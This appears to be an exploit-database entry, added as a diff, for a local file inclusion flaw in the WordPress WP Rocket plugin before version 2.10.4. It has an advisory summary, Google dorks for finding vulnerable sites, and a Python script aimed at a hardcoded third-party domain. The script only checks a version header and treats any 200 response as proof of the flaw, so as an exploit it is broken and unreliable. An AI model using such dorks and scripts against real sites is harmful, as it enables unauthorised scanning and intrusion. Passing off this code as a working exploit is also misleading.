@@ -1,0 +1,71 @@
+id: 39381
+date: 02/28/2024
+title: WordPress WP Rocket < 2.10.3 - Local File Inclusion Vulnerability
+author: E1.Coders
+cves: 
+
+Paulos Yibelo discovered and reported this Local File Inclusion vulnerability in WordPress WP Rocket Plugin. This could allow a malicious actor to include local files of the target website and show its output onto the screen. Files which store credentials, such as database credentials, could potentially allow complete database takeover depending on the configuration. This vulnerability has been fixed in version 2.10.4.
+
+
+https://patchstack.com/database/vulnerability/wp-rocket/wordpress-wp-rocket-plugin-2-10-3-local-file-inclusion-lfi-vulnerability
+
+
+https://vulners.com/wpvulndb/WPVDB-ID:5484D821-7017-47A8-90D8-7D87CB5E0E50
+
+
+Exploit :
+
+#Code By E1.Coders
+
+#Dork : "Powered by WP Rocket" filetype:php intitle:"WP Rocket Configuration" -"in" -"dirlist"
+
+Dork : http://example.com/wp-content/plugins/wp-rocket/inc/functions/min/v2.10.3/min/min.php
+
+
+ 
+
+import requests
+import time
+
+def check_wp_rocket_version(url):
+    version_url = url + "/wp-rocket/css/rocket.css"
+    try:
+        response = requests.get(version_url)
+        version = response.headers["X-Powered-By"]
+        if "WP Rocket/" in version:
+            version = version.split("/")[1]
+            return version
+    except Exception as e:
+        print(f"Error occurred while fetching WP Rocket version: {e}")
+    return None
+
+def test_wp_rocket_lfi_bug(url):
+    lfi_url = url + "/wp-rocket/inc/vendor/composer/installed.json"
+    try:
+        response = requests.get(lfi_url)
+        if response.status_code == 200:
+            return True
+    except Exception as e:
+        print(f"Error occurred while testing LFI: {e}")
+    return False
+
+def main():
+    url = "http://arvatools.com"
+    wp_rocket_version = check_wp_rocket_version(url)
+    if wp_rocket_version:
+        print(f"WP Rocket Version: {wp_rocket_version}")
+        if wp_rocket_version in ["2.10.0", "2.10.1", "2.10.2", "2.10.3"]:
+            result = test_wp_rocket_lfi_bug(url)
+            if result:
+                print("LFI vulnerability found in WP Rocket")
+            else:
+                print("LFI vulnerability not found in WP Rocket")
+        else:
+            print("WP Rocket version is not affected by the LFI bug")
+    else:
+        print("Unable to fetch WP Rocket version")
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2024-03-04]  #
